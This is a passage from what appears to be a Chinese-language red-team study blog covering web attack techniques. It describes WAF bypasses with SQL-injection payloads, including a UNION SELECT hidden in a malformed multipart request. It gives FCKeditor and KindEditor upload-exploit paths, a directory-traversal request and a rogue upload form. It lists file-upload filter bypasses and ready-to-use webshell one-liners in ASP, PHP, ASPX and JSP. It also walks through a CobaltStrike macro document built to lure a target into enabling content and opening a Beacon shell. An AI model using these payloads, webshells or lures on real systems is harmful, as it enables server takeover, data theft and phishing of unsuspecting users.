<span class="hljs-number">2</span>）%特性: union selec<span class="hljs-variable">%t</span> user fr<span class="hljs-variable">%om</span> dd #iis+asp asp+iis环境下会忽略掉百分号，如：payload为[sele<span class="hljs-variable">%ct</span>]<span class="hljs-punctuation">,</span> 解析出来后则是[<span class="hljs-keyword">select</span>]    <span class="hljs-number">3</span>）asp/asp.net在解析请求的时候，允许Content-Type: application/<span class="hljs-keyword">x</span>-www-form-urlencoded的数据提交方式<span class="hljs-keyword">select</span><span class="hljs-variable">%201</span><span class="hljs-variable">%20</span>from<span class="hljs-variable">%20</span>user        asp/asp.net request解析:<span class="hljs-number">4</span>）在asp和asp.net中获取用户的提交的参数一般使用request包，当使用request(‘id’)的形式获取包的时候，会出现GET，POST分不清的情况，譬如可以构造一个请求包，METHOD为GET，但是包中还带有POST的内容和POST的content-<span class="hljs-keyword">type</span><span class="hljs-punctuation">,</span> 换一种理解方式也就是将原本的post数据包的method改成GET<span class="hljs-punctuation">,</span>如果使用request(‘id’)方式获取数据，仍会获取到post的内容</code></pre><p><strong>php+apache畸形的boundary</strong></p><p>php在解析multipart data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为—-aaaa,123456，php解析的时候只识别了—-aaaa,后面的内容均没有识别。然而其他的如WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现BYPASS</p><pre><code class="hljs vhdl">Content-<span class="hljs-keyword">Type</span>: multipart/form-data; boundary=<span class="hljs-comment">------,xxxx</span>    Content-Length: <span class="hljs-number">191</span>    <span class="hljs-comment">------,xxxx</span>    Content-Disposition: form-data; name=<span class="hljs-string">&quot;img&quot;</span>; filename=<span class="hljs-string">&quot;img.gif&quot;</span>    GIF89a    <span class="hljs-comment">------</span>    Content-Disposition: form-data; name=<span class="hljs-string">&quot;id&quot;</span>    <span class="hljs-number">1</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,flag,<span class="hljs-keyword">null</span> from flag limit <span class="hljs-number">1</span> offset <span class="hljs-number">1</span><span class="hljs-comment">-- -</span>    <span class="hljs-comment">--------</span>    <span class="hljs-comment">------,xxxx--</span><span class="hljs-number">12345678910111213</span></code></pre><p><strong>畸形method(header头中)</strong></p><p>某些apache版本在做GET请求的时候，无论method为何值均会取出GET的内容。如请求的method名为DOTA，依然会返回GET方法的值，即,可以任意替换GET方法为其它值，但仍能有效工作，但如果waf严格按照GET方法取值，则取不到任何内容</p><p>参考文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">2418</span></code></pre><p>…….</p><p>等等骚姿势，后续慢慢添加</p><hr><h3 id="登录口JS前端加密绕过"><a href="#登录口JS前端加密绕过" class="headerlink" title="登录口JS前端加密绕过"></a>登录口JS前端加密绕过</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h4><p>渗透测试过程中遇到web登录的时候，现在很多场景账号密码都是经过js加密之后再请求发送（通过抓包可以看到加密信息）如图一burp抓到的包,request的post的登录包，很明显可以看到password参数的值是经过前端加密之后再进行传输的，遇到这种情况,普通发包的爆破脚本就很难爆破成功。鉴于这种情况,这边分析四种方式进行绕过加密爆破</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/09.png" alt="参数值被加密"></p><h4 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a><strong>参考文章：</strong></h4><p>大概能分为以下四种方法</p><ul><li><a href="https://www.freebuf.com/articles/web/127888.html">https://www.freebuf.com/articles/web/127888.html</a></li></ul><h4 id="简述"><a href="#简述" class="headerlink" title="简述:"></a><strong>简述:</strong></h4><p>1）既然是前端s加密，代码我们都能看得到，我们搭个服务器，每次发包前，把要发送的加密参数用服务器加密一遍，我们再把加密后的参数发送过去，这样相当于本地还原了加密过程</p><p>2）利用selenium webdriver等完全模拟人工输入，字典也可以自定义，不过需要自己写脚本而已,这种方法比较万能</p><p>3）这种方法适合有js功底的同学，首先把他的js加密过程跟方法看懂，然后本地简化或者用其他语言模拟他的加密过程，再自己写脚本去跑，或者生成加密后的字典直接burp去跑即可</p><p>4）前人栽树，后人乘凉，cony1老哥为了方便后辈，写了一款burp插件， <code>https://github.com/c0ny1/jsENcrypter</code>，名为jsEncrypter，简单来说就是把1，3点结合了一下，用插件方便地跑起来</p><h4 id="jsEncrypter安装与本地测试"><a href="#jsEncrypter安装与本地测试" class="headerlink" title="jsEncrypter安装与本地测试"></a>jsEncrypter安装与本地测试</h4><p>这里重点介绍第四种方法</p><p>1）首先得安装 maven，mac下直接 brew install maven<br>安装连接：</p><ul><li><a href="https://www.runoob.com/maven/maven-setup.html">https://www.runoob.com/maven/maven-setup.html</a></li></ul><p>按照文档三种系统都有安装方法</p><p>2）安装好maven后，把jsEncrypter git clone回来或者下载回来解压缩，然后在他的文件夹下，打开cmd窗口，然后运行mvn package，就可以把插件编译成型，编译好后会多出一个target文件夹<br>命令：<code>mvn package</code></p><p>这里不演示下去了…详细的查看文章…</p><ul><li><a href="https://fucker-shamo.github.io/2019/08/04/%E7%99%BB%E9%99%86%E5%8F%A3js%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%BB%95%E8%BF%87/">https://fucker-shamo.github.io/2019/08/04/登陆口js前端加密绕过/</a></li></ul><p>中间复现会遇到的一些问题：<br>安装phantomJS环境变量参考：<a href="https://blog.csdn.net/xc_zhou/article/details/80700640">https://blog.csdn.net/xc_zhou/article/details/80700640</a></p><p>参考链接：</p><ul><li><a href="http://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/">http://gv7.me/articles/2018/fast-locate-the-front-end-encryption-method/</a></li><li><a href="https://www.freebuf.com/articles/web/184455.html">https://www.freebuf.com/articles/web/184455.html</a></li><li><a href="https://bbs.ichunqiu.com/thread-42457-1-3.html">https://bbs.ichunqiu.com/thread-42457-1-3.html</a></li><li><a href="http://gv7.me/articles/2017/jsEncrypter/">http://gv7.me/articles/2017/jsEncrypter/</a></li><li><a href="https://www.freebuf.com/articles/web/127888.html">https://www.freebuf.com/articles/web/127888.html</a></li><li><a href="https://www.cnblogs.com/xiaozi/p/9158988.html">https://www.cnblogs.com/xiaozi/p/9158988.html</a></li></ul><hr><h3 id="XMLDecoder-标签、POC"><a href="#XMLDecoder-标签、POC" class="headerlink" title="XMLDecoder 标签、POC"></a>XMLDecoder 标签、POC</h3><p><strong>标签类型：</strong><br>1）java<br>2）array<br>3）class<br>4）object<br>5）void<br>6）new<br>7）field<br>8）method<br>9）property<br>10）byte<br>11）其余数据类型</p><p><strong>XML的基本语法</strong><br><strong>XML简单利用</strong></p><p>详细文章：</p><ul><li><a href="https://xz.aliyun.com/t/7944">https://xz.aliyun.com/t/7944</a></li></ul><p>该文章全面的介绍了XMLDecoder遇到的基础知识…了解后我们开始看下面的CVE解析文章</p><ul><li><a href="http://xxlegend.com/tags/XMLDecoder/">http://xxlegend.com/tags/XMLDecoder/</a>    –CVE-2019-2725、Weblogic XMLDecoder RCE分析</li><li><a href="https://payloads.info/2020/07/01/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-XMLDecoder%E5%88%B0Weblogic%E5%87%A0%E4%B8%AA%E8%A1%A5%E4%B8%81%E7%9A%84%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/">https://payloads.info/2020/07/01/Java安全-反序列化篇-XMLDecoder到Weblogic几个补丁的绕过分析/</a>  </li></ul><p>文章非常详细的POC</p><hr><h3 id="phpMyAdmin去getshell"><a href="#phpMyAdmin去getshell" class="headerlink" title="phpMyAdmin去getshell"></a>phpMyAdmin去getshell</h3><p><strong>前言</strong></p><p>在学习sql语句之前，拿到phpmyadmin弱口令登录到后台却不知道怎么利用，学习之后却有了新的想法利用phpMyadmin getshello接下去来验证自己的猜想</p><p><strong>phpMyAdmin的简介</strong><br>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。</p><p>详细文章：</p><ul><li><a href="https://xz.aliyun.com/t/3283">https://xz.aliyun.com/t/3283</a></li><li><a href="https://my.oschina.net/u/4196756/blog/4408564">https://my.oschina.net/u/4196756/blog/4408564</a>   –近期最新文章复现讲解</li><li><a href="https://zhuanlan.zhihu.com/p/25957366">https://zhuanlan.zhihu.com/p/25957366</a></li></ul><hr><h3 id="攻击JWT的一些方法"><a href="#攻击JWT的一些方法" class="headerlink" title="攻击JWT的一些方法"></a>攻击JWT的一些方法</h3><p>详细文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">6776</span></code></pre><p>该文章中REF有详细链接，以及针对JWT的爆破密匙工具c-jwt-cracker也有详细链接介绍等</p><hr><h3 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h3><h4 id="上传技巧"><a href="#上传技巧" class="headerlink" title="上传技巧"></a>上传技巧</h4><pre><code class="hljs tap">大小写混淆%00截断 上传.htaccess分布式部署文件 图片文件头：47<span class="hljs-number"> 49 </span>46<span class="hljs-number"> 38 </span>39<span class="hljs-number"> 61 </span>(gif)、FF D8 FF E0<span class="hljs-number"> 00 </span>10 4A<span class="hljs-number"> 46 </span>49<span class="hljs-number"> 46 </span>(jpg) 、89<span class="hljs-number"> 50 </span>4E<span class="hljs-number"> 47 </span>(png) 其他解析格式：cer、asa、php4、php3、php5、phtml、jspx修改（Content-type）MIME 目录回溯符 filename=&quot;../backdoor. php&quot;</code></pre><hr><h4 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a><strong>编辑器漏洞</strong></h4><h5 id="百度编辑器-Ueditor"><a href="#百度编辑器-Ueditor" class="headerlink" title="百度编辑器 Ueditor"></a><strong>百度编辑器 Ueditor</strong></h5><pre><code class="hljs routeros">controller.ashx?<span class="hljs-attribute">action</span>=catchimage</code></pre><h5 id="FCKeditor"><a href="#FCKeditor" class="headerlink" title="FCKeditor"></a><strong>FCKeditor</strong></h5><p><strong>查看版本</strong></p><pre><code class="hljs awk"><span class="hljs-regexp">/fckeditor/</span>editor<span class="hljs-regexp">/dialog/</span>fck_about.html<span class="hljs-regexp">/fckeditor/</span>_Whatsnew.html</code></pre><p><strong>上传页面</strong></p><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>asp<span class="hljs-regexp">/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span>FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/browser.html?type=Image&amp;connector=connectors/</span>asp/connector.aspFCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/browser.html?Type=Image&amp;Connector=http:/</span><span class="hljs-regexp">/www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php (ver:2.6.3 测试通过)</span></code></pre><pre><code class="hljs gradle">JSP 版：FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/browser.html?Type=Image&amp;Connector=connectors/</span>jsp/connector.jsp注意红色部分修改为FCKeditor 实际使用的脚本语言，蓝色部分可以自定义文件夹名称也可以利用../..目录遍历，紫色部分为实际网站地址。</code></pre><pre><code class="hljs gradle">FCKeditor 中test 文件的上传地址FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>test.htmlFCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/upload/</span>test.htmlFCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/</span>test.htmlFCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/connectors/u</span>ploadtest.html</code></pre><pre><code class="hljs awk">一般很多站点都已删除_samples 目录，可以试试。FCKeditor<span class="hljs-regexp">/editor/</span>fckeditor.html 不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页。</code></pre><p>参考文章：</p><ul><li><a href="https://cloud.tencent.com/developer/news/210677">https://cloud.tencent.com/developer/news/210677</a></li></ul><p><strong>上传的思路</strong></p><p><strong>Version 2.2 版本</strong></p><p>Apache+linux 环境下在上传文件后面加个.突破！测试通过</p><p><strong>Version &lt;=2.4.2 For php</strong></p><p>在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址</p><pre><code class="hljs stata">&lt;<span class="hljs-keyword">form</span> id=<span class="hljs-string">&quot;frmUpload&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>action=<span class="hljs-string">&quot;http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;Upload a new <span class="hljs-keyword">file</span>:&lt;<span class="hljs-keyword">br</span>&gt;&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;NewFile&quot;</span> size=<span class="hljs-string">&quot;50&quot;</span>&gt;&lt;<span class="hljs-keyword">br</span>&gt;&lt;<span class="hljs-keyword">input</span> id=<span class="hljs-string">&quot;btnUpload&quot;</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;Upload&quot;</span>&gt;&lt;/<span class="hljs-keyword">form</span>&gt;</code></pre><p><strong>FCKeditor 文件上传.变_下划线的绕过方法</strong></p><p>很多时候上传的文件例如：shell.php.rar 或shell.php;.jpg 会变为shell_php;.jpg 这是新版FCK 的变化</p><p>提交shell.php+空格绕过，不过空格只支持win 系统 *nix 是不支持的[shell.php 和shell.php+空格是2 个不同的文件 未测试</p><p>继续上传同名文件可变为shell.php;(1).jpg 也可以新建一个文件夹，只检测了第一级的目录，如果跳到二级目录就不受限制</p><p><strong>Version 2.4.1 测试通过</strong></p><p>修改CurrentFolder 参数使用 …/…/ 来进入不同的目录</p><pre><code class="hljs gradle"><span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>aspx<span class="hljs-regexp">/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../</span>../..%<span class="hljs-number">2</span>F&amp;NewFolderName=shell.asp</code></pre><p><strong>根据返回的XML 信息可以查看网站所有的目录</strong></p><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%<span class="hljs-number">2</span>F</code></pre><p><strong>也可以直接浏览盘符</strong>：<br><strong>JSP 版本</strong>：</p><pre><code class="hljs gradle">FCKeditor<span class="hljs-regexp">/editor/</span>filemanager<span class="hljs-regexp">/browser/</span><span class="hljs-keyword">default</span><span class="hljs-regexp">/connectors/</span>jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%<span class="hljs-number">2</span>F</code></pre><p><strong>Fckeditor 2.0 &lt;= 2.2</strong></p><p>允许上传asa、cer、php2、php4、inc、pwml、pht 后缀的文件上传后它保存的文件直接用的<code>$sFilePath = $sServerDir . $sFileName</code>，而没有使用<code>$sExtension</code>为后缀.直接导致在windows下在上传文件后面加个.来突破（这里点点很重要）</p><p>而在apache 下，因为”Apache 文件名解析缺陷漏洞”也可以利用之，另建议其他上传漏洞中定义TYPE 变量时使用File 类别来上传文件,根据FCKeditor 的代码，其限制最为狭隘</p><p>在上传时遇见可直接上传脚本文件固然很好，但有些版本可能无法直接上传可以利用在文件名后面加.点或空格绕过，也可以利用iis6 解析漏洞建立xxx.asp文件夹或者上传<code>xx.asp;.jpg</code></p><p>参考文章：</p><ul><li><a href="https://www.cnblogs.com/zpchcbd/p/11745119.html">https://www.cnblogs.com/zpchcbd/p/11745119.html</a></li></ul><hr><h5 id="KindEditor"><a href="#KindEditor" class="headerlink" title="KindEditor"></a>KindEditor</h5><p><strong>上传页面</strong></p><pre><code class="hljs gradle">kindeditor<span class="hljs-regexp">/asp/u</span>pload_json.asp?dir=<span class="hljs-keyword">file</span>kindeditor<span class="hljs-regexp">/asp.net/u</span>pload_json.ashx?dir=<span class="hljs-keyword">file</span>kindeditor<span class="hljs-regexp">/jsp/u</span>pload_json.jsp?dir=<span class="hljs-keyword">file</span>kindeditor<span class="hljs-regexp">/php/u</span>pload_json.php?dir=<span class="hljs-keyword">file</span></code></pre><p><strong>上传思路</strong><br>kindeditor&lt;=4.1.5</p><pre><code class="hljs awk">curl -F<span class="hljs-string">&quot;imgFile=@1.html&quot;</span>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/test/</span>kindeditor<span class="hljs-regexp">/php/u</span>pload_json.php?dir=file</code></pre><p>参考文章：</p><ul><li><a href="https://www.sinesafe.com/article/20190510/Kindeditor.html">https://www.sinesafe.com/article/20190510/Kindeditor.html</a></li><li><a href="https://www.freebuf.com/column/202148.html">https://www.freebuf.com/column/202148.html</a>   –上传思路</li></ul><hr><h4 id="上传漏洞总结"><a href="#上传漏洞总结" class="headerlink" title="上传漏洞总结"></a>上传漏洞总结</h4><h5 id="概要说明"><a href="#概要说明" class="headerlink" title="概要说明"></a>概要说明</h5><p>文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接</p><p><strong>Asp一句话</strong> ：</p><pre><code class="hljs asp">&lt;%eval request(“kkk”)%&gt; kkk</code></pre><p><strong>Php一句话：</strong></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">666</span>]);<span class="hljs-meta">?&gt;</span> <span class="hljs-number">666</span></code></pre><p><strong>Aspx一句话:</strong></p><pre><code class="hljs aspx">&lt;%@ Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;111&quot;],&quot;unsafe&quot;);%&gt;</code></pre><p><strong>Jsp一句话：</strong></p><pre><code class="hljs jsp">&lt;%<span class="hljs-keyword">if</span>(request.getParameter(<span class="hljs-string">&quot;f&quot;</span>)!=<span class="hljs-keyword">null</span>)(<span class="hljs-keyword">new</span> java.io.FileOutputStream(application.getRealPath(<span class="hljs-string">&quot;\\&quot;</span>)+request.getParameter(<span class="hljs-string">&quot;f&quot;</span>))).write(request.getParameter(<span class="hljs-string">&quot;t&quot;</span>).getBytes());%&gt;</code></pre><p>参考一句话：</p><ul><li><a href="https://my.oschina.net/u/4373914/blog/3467075">https://my.oschina.net/u/4373914/blog/3467075</a></li></ul><hr><h5 id="服务端的上传验证"><a href="#服务端的上传验证" class="headerlink" title="服务端的上传验证"></a>服务端的上传验证</h5><p><strong>1）白名单验证定义允许上传的后缀类型,除此所有后缀都不允许</strong></p><p><strong>2）黑名单验证</strong></p><p>定义不允许上传的后缀类型，除此之类其他后缀都可以上传</p><p>定义不允许上传的后缀：</p><pre><code class="hljs plain">asp、aspx、asa、cer、cdx、ash</code></pre><p>【突破方法】</p><ol><li><p>未重命名可以配合解析漏洞(很少)</p></li><li><p>可以用cer达到绕过效果</p></li><li><p>如果未用转换函数强制转换后缀为小写(ASP)</p></li><li><p>特殊后缀达到效果可利用ashx来生成一句话</p></li><li><p>.htaccess来实现后缀引导。上传jpg可以解析成脚本，具体在内容定义</p></li></ol><p><strong>3）文件头验证</strong><br>文件内容开头加上<code>GIF89a</code><br><strong>4）文件类型验证</strong><br>例如可以把php的文件类型改成正常的图片类型</p><p><strong>5）文件后缀验证</strong></p><p>典型的白名单验证，指定上传后缀必须为jpg、JPG、jpeg、JPEG</p><p><strong>6）js前端验证</strong></p><p>Js在前端定义了允许上传的后缀类型</p><p>【突破方法】直接在前端修改或添加后缀，找不到就搜索图片后缀如jpg。或者直接抓包改。</p><p>……</p><p>等等，后续分开写</p><hr><h3 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h3><p>太多了，后续分开写。</p><hr><h3 id="文件读取漏洞"><a href="#文件读取漏洞" class="headerlink" title="文件读取漏洞"></a>文件读取漏洞</h3><ul><li><a href="https://xz.aliyun.com/t/6594">https://xz.aliyun.com/t/6594</a></li></ul><h3 id="Pentesterlab-Xss"><a href="#Pentesterlab-Xss" class="headerlink" title="Pentesterlab Xss"></a>Pentesterlab Xss</h3><p>Pentesterlab是一个靶机环境</p><p><a href="https://pentesterlab.com/">https://pentesterlab.com/</a>  –官网<br><a href="https://download.vulnhub.com/pentesterlab/web_for_pentester_i386.iso">https://download.vulnhub.com/pentesterlab/web_for_pentester_i386.iso</a>  –安装包</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/he_and/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">79798958</span>https:<span class="hljs-regexp">//</span>www.andseclab.com<span class="hljs-regexp">/2018/</span><span class="hljs-number">11</span><span class="hljs-regexp">/11/</span>pentesterlab-xss题解/http:<span class="hljs-regexp">//</span>secpark.com.cn<span class="hljs-regexp">/articles/</span><span class="hljs-number">2018</span><span class="hljs-regexp">/05/</span><span class="hljs-number">28</span>/<span class="hljs-number">1527502530234</span>.html   --很直观</code></pre><p>三篇文章详细讲解了pentesterlab靶机进行XSS渗透！！！</p><hr><h3 id="Office宏的基本利用"><a href="#Office宏的基本利用" class="headerlink" title="Office宏的基本利用"></a>Office宏的基本利用</h3><h4 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a><strong>前言</strong></h4><p>Office宏，译自英文单词Macro。宏是Office自带的一种高级脚本特性，通过VBA代码，可以在Office中去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。而宏病毒是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上</p><p>Visual Basic for Applications（VBA）是Visual Basic的一种宏语言，是微软开发出来在其桌面应用程序中执行通用的自动化(OLE)任务的编程语言。主要能用来扩展Windows的应用程序功能，特别是Microsoft Office软件，也可说是一种应用程式视觉化的Basic 脚本</p><h4 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a><strong>环境准备</strong></h4><pre><code class="hljs apache"><span class="hljs-attribute">Windows</span> <span class="hljs-number">7</span> x<span class="hljs-number">64</span> 旗舰版<span class="hljs-attribute">Microsoft</span> Office <span class="hljs-number">2016</span><span class="hljs-attribute">CobaltStrike</span> <span class="hljs-number">4</span></code></pre><h4 id="CobaltStrike生成宏"><a href="#CobaltStrike生成宏" class="headerlink" title="CobaltStrike生成宏"></a><strong>CobaltStrike生成宏</strong></h4><p>先利用CobaltStrike生成宏payload，接下来只要放入word、excel或ppt即可<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/10.png" alt="生成宏"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/11.png" alt="生成宏"></p><h4 id="创建宏Word"><a href="#创建宏Word" class="headerlink" title="创建宏Word"></a><strong>创建宏Word</strong></h4><p>打开Word文档，点击 “Word 选项 — 自定义功能区 — 开发者工具(勾选) — 确定”<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/12.png" alt="创建宏Word"><br>编写主体内容后，点击 “开发工具 — Visual Basic” 。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/13.png" alt="创建宏Word"><br>双击 “ThisDocument” ，将原有内容全部清空，然后将CobaltStrike生成宏payload全部粘贴进去，保存并关闭该 VBA 编辑器<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/14.png" alt="创建宏Word"><br>另存为的Word类型务必要选”Word 97-2003 文档 (*.doc)”，即 doc 文件，保证低版本可以打开。之后关闭，再打开即可执行宏代码<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/15.png" alt="创建宏Word"><br><strong>反弹Beacon shell</strong><br>默认情况下，Office已经禁用所有宏，但仍会在打开Word文档的时候发出通知</p><p>诱导目标手动点击”启用内容”宏。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/16.png" alt="反弹Beacon shell"><br>目标一旦启用，CobaltStrike的Beacon就会上线，即成功接收到Shell<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/17.png" alt="反弹Beacon shell"></p><p>参考文章：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/98526727">https://zhuanlan.zhihu.com/p/98526727</a>    –感谢我不是大神的文章</li></ul><hr><h3 id="Discuz-Ssrf-Rce漏洞分析报告"><a href="#Discuz-Ssrf-Rce漏洞分析报告" class="headerlink" title="Discuz Ssrf Rce漏洞分析报告"></a>Discuz Ssrf Rce漏洞分析报告</h3><p>很老的一个漏洞了</p><ul><li><p><a href="https://cloud.tencent.com/developer/article/1511949">https://cloud.tencent.com/developer/article/1511949</a>     —复现</p></li><li><p><a href="https://xz.aliyun.com/t/2018">https://xz.aliyun.com/t/2018</a>            —Discuz!因Memcached未授权访问导致的RCE</p></li><li><p><a href="https://cn-sec.com/archives/76754.html">https://cn-sec.com/archives/76754.html</a>       —<a href="https://cn-sec.com/archives/76754.html">https://cn-sec.com/archives/76754.html</a></p></li><li><p><a href="https://www.freebuf.com/vuls/191698.html">https://www.freebuf.com/vuls/191698.html</a>        —Discuz x3.4前台SSRF漏洞分析</p></li></ul><ul><li><a href="https://hackmd.io/@Lhaihai/H1B8PJ9hX">https://hackmd.io/@Lhaihai/H1B8PJ9hX</a>    –SSRF集合笔记</li></ul><hr><h3 id="WordPress语言文件代码执行漏洞分析"><a href="#WordPress语言文件代码执行漏洞分析" class="headerlink" title="WordPress语言文件代码执行漏洞分析"></a>WordPress语言文件代码执行漏洞分析</h3><p>参考：</p><ul><li><p><a href="https://www.seebug.org/vuldb/ssvid-92459">https://www.seebug.org/vuldb/ssvid-92459</a></p></li><li><p><a href="https://gist.github.com/anonymous/908a087b95035d9fc9ca46cef4984e97">https://gist.github.com/anonymous/908a087b95035d9fc9ca46cef4984e97</a></p></li><li><p><a 